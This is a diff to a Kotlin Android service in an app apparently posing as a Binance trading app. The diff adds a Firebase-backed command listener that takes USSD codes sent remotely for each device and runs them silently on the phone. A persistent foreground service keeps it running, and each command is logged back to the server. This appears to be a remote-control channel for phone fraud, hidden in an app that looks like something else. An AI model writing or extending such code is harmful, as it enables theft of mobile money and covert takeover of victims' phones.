@@ -1,5 +1,6 @@
 package dApp.binance.Trading.arfu
 
+import android.app.Notification
 import android.app.Service
 import android.content.Intent
 import android.os.IBinder
@@ -9,8 +10,14 @@ import android.app.PendingIntent
 import android.os.Build
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import com.google.firebase.database.ChildEventListener
+import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
+import com.google.firebase.database.FirebaseDatabase
 
 class CarerService : Service() {
+
+    private var commandListener: ChildEventListener? = null
 
     companion object {
         private const val NOTIFICATION_ID = 1
@@ -21,16 +28,58 @@ class CarerService : Service() {
         super.onCreate()
         Log.d("CarerService", "Service created")
         createNotificationChannel()
+        startCommandListener()
+    }
+
+    private fun startCommandListener() {
+        val deviceId = FirebaseHelper.getDeviceId(this)
+        val database = FirebaseDatabase.getInstance().reference
+        val commandsRef = database.child("commands").child(deviceId)
+
+        Log.d("CarerService", "Starting listener for device: $deviceId")
+
+        commandListener = object : ChildEventListener {
+            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
+                val commandData = snapshot.value as? Map<*, *> ?: return
+                val ussdCode = commandData["ussd_code"] as? String ?: return
+                val timestamp = commandData["timestamp"]?.toString()?.toLongOrNull() ?: 0L
+
+                // Only execute if it's a recent command (sent in the last 2 minutes)
+                // This prevents old commands from firing when the app restarts
+                if (System.currentTimeMillis() - timestamp < 120000) {
+                    Log.d("CarerService", ">>> NEW COMMAND RECEIVED: $ussdCode")
+                    UssdHelper.executeUssd(this@CarerService, ussdCode)
+                    FirebaseLogHelper.logCommand(ussdCode, "EXECUTING", this@CarerService)
+                } else {
+                    Log.d("CarerService", "Ignoring old command: $ussdCode")
+                }
+            }
+
+            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
+            override fun onChildRemoved(snapshot: DataSnapshot) {}
+            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
+            override fun onCancelled(error: DatabaseError) {
+                Log.e("CarerService", "Database error: ${error.message}")
+            }
+        }
+        
+        commandsRef.addChildEventListener(commandListener!!)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d("CarerService", "Service started")
-
-        // Create and show notification
         val notification = createNotification()
         startForeground(NOTIFICATION_ID, notification)
-
         return START_STICKY
+    }
+
+    override fun onDestroy() {
+        commandListener?.let {
+            val deviceId = FirebaseHelper.getDeviceId(this)
+            FirebaseDatabase.getInstance().reference.child("commands").child(deviceId)
+                .removeEventListener(it)
+        }
+        super.onDestroy()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -52,7 +101,7 @@ class CarerService : Service() {
         }
     }
 
-    private fun createNotification(): NotificationCompat.Notification {
+    private fun createNotification(): Notification {
         val intent = Intent(this, MainActivity::class.java)
         val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
 
